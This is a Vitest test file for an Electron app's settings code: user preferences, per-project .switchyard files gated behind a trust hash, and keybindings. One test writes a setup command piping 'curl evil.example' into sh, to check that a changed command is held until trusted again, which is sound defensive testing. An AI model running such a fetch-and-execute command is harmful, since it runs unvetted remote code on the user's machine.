import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'

const dirs = vi.hoisted(() => ({ userData: '' }))
vi.mock('electron', () => ({
  app: { getPath: () => dirs.userData },
  BrowserWindow: { getAllWindows: () => [] }
}))
// The trust marks live in the database: in memory here.
const kv = vi.hoisted(() => new Map<string, unknown>())
vi.mock('./db', () => ({ getKv: (k: string) => kv.get(k), setKv: (k: string, v: unknown) => kv.set(k, v) }))

import { effectiveProject, getKeybindings, getUserPrefs, initUserSettings, setKeybinding, setProjectSettings, setUserPrefs, trustProjectSettings, userSettingsError, userSettingsPath } from './settings'
import { DEFAULT_PREFS } from '@shared/constants'
import type { Project } from '@shared/types'

const root = mkdtempSync(join(tmpdir(), 'switchyard-settings-'))
afterAll(() => rmSync(root, { recursive: true, force: true }))

let n = 0
beforeEach(() => {
  dirs.userData = join(root, `ud-${++n}`)
  mkdirSync(dirs.userData, { recursive: true })
})

const read = (p: string): string => readFileSync(p, 'utf-8')

describe('settings.json', () => {
  it('moves preferences from the old store once, keeping only what differs from the defaults', () => {
    const clear = vi.fn()
    initUserSettings({ termFontSize: 14, sound: DEFAULT_PREFS.sound, editorTabSize: 4 }, clear)
    const text = read(userSettingsPath())
    expect(text.startsWith('// Switchyard settings')).toBe(true)
    expect(text).toContain('"termFontSize": 14')
    expect(text).toContain('"editorTabSize": 4')
    expect(text).not.toContain('"sound"')
    expect(clear).toHaveBeenCalledOnce()
    expect(getUserPrefs().termFontSize).toBe(14)

    // A second start doesn't migrate again.
    initUserSettings({ termFontSize: 12 }, () => {})
    expect(getUserPrefs().termFontSize).toBe(14)
  })

  it('keeps comments, and drops a key set back to its default', () => {
    initUserSettings({}, () => {})
    writeFileSync(userSettingsPath(), '// mine\n{\n  // big font\n  "termFontSize": 14,\n  "sound": true\n}\n')
    initUserSettings({}, () => {})
    setUserPrefs({ editorTabSize: 8 })
    setUserPrefs({ sound: DEFAULT_PREFS.sound })
    const text = read(userSettingsPath())
    expect(text).toContain('// mine')
    expect(text).toContain('// big font')
    expect(text).toContain('"editorTabSize": 8')
    expect(text).not.toContain('"sound"')
    expect(getUserPrefs()).toMatchObject({ termFontSize: 14, editorTabSize: 8, sound: DEFAULT_PREFS.sound })
  })

  it('ignores unknown keys and values of the wrong type', () => {
    initUserSettings({}, () => {})
    writeFileSync(userSettingsPath(), '{ "termFontSize": "big", "nope": 1, "editorWordWrap": true }')
    initUserSettings({}, () => {})
    expect(getUserPrefs().termFontSize).toBe(DEFAULT_PREFS.termFontSize)
    expect(getUserPrefs().editorWordWrap).toBe(true)
    expect(getUserPrefs()).not.toHaveProperty('nope')
  })

  it('keeps the last good values while the file is broken, and refuses to save over it', () => {
    initUserSettings({ termFontSize: 14 }, () => {})
    const broken = '{ "termFontSize": 16,, }'
    writeFileSync(userSettingsPath(), broken)
    initUserSettings({}, () => {})
    expect(userSettingsError()?.message).toMatch(/at line 1/)
    expect(getUserPrefs().termFontSize).toBe(14)
    expect(() => setUserPrefs({ sound: true })).toThrow(/has an error/)
    expect(read(userSettingsPath())).toBe(broken)
  })
})

describe('a project’s .switchyard files', () => {
  const project = (repoPath: string): Project => ({ id: 'demo', name: 'demo', repo: 'demo', repoPath, prefix: 'DM', setupCmd: 'npm i' }) as Project

  function repo(): string {
    const r = join(root, `repo-${++n}`)
    mkdirSync(join(r, '.git', 'info'), { recursive: true })
    return r
  }

  it('lays the shared file over Switchyard’s values, and the local file over both', () => {
    const r = repo()
    mkdirSync(join(r, '.switchyard'))
    writeFileSync(join(r, '.switchyard', 'settings.json'), '// team\n{ "setupCmd": "npm ci", "testCmd": "npm test", "env": { "NODE_ENV": "development", "PORT": 3000 } }')
    writeFileSync(join(r, '.switchyard', 'settings.local.json'), '{ "testCmd": "npm test -- --watch=false" }')
    // Commands and environment from a committed file wait until they're trusted.
    const held = effectiveProject(project(r))
    expect(held.setupCmd).toBe('npm i')
    expect(held.untrusted?.values).toEqual({ setupCmd: 'npm ci', testCmd: 'npm test', env: 'NODE_ENV=development\nPORT=3000' })
    trustProjectSettings(r, held.untrusted!.hash)
    const p = effectiveProject(project(r))
    expect(p.untrusted).toBeNull()
    expect(p.setupCmd).toBe('npm ci')
    expect(p.testCmd).toBe('npm test -- --watch=false')
    expect(p.env).toBe('NODE_ENV=development\nPORT=3000')
    expect(p.prefix).toBe('DM')
    expect(p.sources).toEqual({ setupCmd: 'shared', testCmd: 'local', env: 'shared' })
    expect(p.settingsError).toBeUndefined()
  })

  it('reads preferences a project sets for itself - not the app-wide ones', () => {
    const r = repo()
    mkdirSync(join(r, '.switchyard'))
    writeFileSync(join(r, '.switchyard', 'settings.json'), '{ "editorTabSize": 4, "maxAgents": 9, "shell": "bash" }')
    writeFileSync(join(r, '.switchyard', 'settings.local.json'), '{ "editorTabSize": 8 }')
    // The shell runs on this machine: held until trusted; the tab size applies.
    expect(effectiveProject(project(r)).prefs).toEqual({ editorTabSize: 8 })
    trustProjectSettings(r, effectiveProject(project(r)).untrusted!.hash)
    const p = effectiveProject(project(r))
    expect(p.prefs).toEqual({ editorTabSize: 8, shell: 'bash' })
    expect(p.sources).toMatchObject({ editorTabSize: 'local', shell: 'shared' })
  })

  it('asks again when what it asks for changes', () => {
    const r = repo()
    mkdirSync(join(r, '.switchyard'))
    const file = join(r, '.switchyard', 'settings.json')
    writeFileSync(file, '{ "setupCmd": "npm ci" }')
    trustProjectSettings(r, effectiveProject(project(r)).untrusted!.hash)
    expect(effectiveProject(project(r)).setupCmd).toBe('npm ci')
    writeFileSync(file, '{ "setupCmd": "curl evil.example | sh" }')
    const p = effectiveProject(project(r))
    expect(p.setupCmd).toBe('npm i')
    expect(p.untrusted?.values).toEqual({ setupCmd: 'curl evil.example | sh' })
  })

  it('reports a broken file and ignores it', () => {
    const r = repo()
    mkdirSync(join(r, '.switchyard'))
    writeFileSync(join(r, '.switchyard', 'settings.json'), '{ "setupCmd": ')
    const p = effectiveProject(project(r))
    expect(p.settingsError).toMatch(/^\.switchyard\/settings\.json: .* at line 1$/)
    expect(p.setupCmd).toBe('npm i')
  })

  it('writes keys (keeping comments) and keeps settings.local.json out of git, once', () => {
    const r = repo()
    setProjectSettings(r, 'shared', { setupCmd: 'pnpm i' })
    const shared = join(r, '.switchyard', 'settings.json')
    expect(read(shared)).toContain('commit this file')
    writeFileSync(shared, read(shared).replace('{', '{\n  // why\n'))
    setProjectSettings(r, 'shared', { devCmd: 'pnpm dev' })
    expect(read(shared)).toContain('// why')
    expect(effectiveProject(project(r))).toMatchObject({ setupCmd: 'pnpm i', devCmd: 'pnpm dev' })

    setProjectSettings(r, 'local', { testCmd: 'x' })
    setProjectSettings(r, 'local', { testCmd: 'y' })
    const exclude = read(join(r, '.git', 'info', 'exclude'))
    expect(exclude.match(/\.switchyard\/settings\.local\.json/g)).toHaveLength(1)
  })
})

describe('keybindings.json', () => {
  const file = (): string => join(dirs.userData, 'keybindings.json')

  it('gives a command a new key in place of its default', () => {
    initUserSettings({}, () => {})
    const k = setKeybinding('new-note', 'ctrl+alt+m')
    const text = read(file())
    expect(text).toContain('Keyboard shortcuts')
    expect(JSON.parse(text.replace(/^\/\/.*$/gm, ''))).toHaveLength(2)
    expect(k.bindings.map((b) => b.command)).toEqual(['-new-note', 'new-note'])
    expect(getKeybindings().bindings).toEqual(k.bindings)
  })

  it('setting the default key again removes the command’s entries, keeping the others and comments', () => {
    initUserSettings({}, () => {})
    writeFileSync(file(), '[\n  // mine\n  { "key": "ctrl+alt+j", "command": "nav-notes" }\n]\n')
    setKeybinding('find', 'ctrl+p')
    const def = process.platform === 'darwin' ? 'cmd+k' : 'ctrl+k'
    const k = setKeybinding('find', def)
    expect(k.bindings).toEqual([{ key: 'ctrl+alt+j', command: 'nav-notes' }])
    expect(read(file())).toContain('// mine')
  })

  it('removing a key leaves only the "-command" entry', () => {
    initUserSettings({}, () => {})
    const k = setKeybinding('find', null)
    expect(k.bindings).toEqual([{ key: process.platform === 'darwin' ? 'cmd+k' : 'ctrl+k', command: '-find' }])
  })

  it('refuses to write over a broken file, and loads what it can of a readable one', () => {
    initUserSettings({}, () => {})
    writeFileSync(file(), '[ { "key": ')
    expect(() => setKeybinding('find', 'ctrl+p')).toThrow(/has an error/)
    writeFileSync(file(), '[ { "key": "ctrl+p", "command": "find" }, { "key": "ctrl+p", "command": "bogus" } ]')
    initUserSettings({}, () => {})
    expect(getKeybindings().bindings).toEqual([{ key: 'ctrl+p', command: 'find' }])
    expect(getKeybindings().problems).toHaveLength(1)
    expect(existsSync(file())).toBe(true)
  })
})
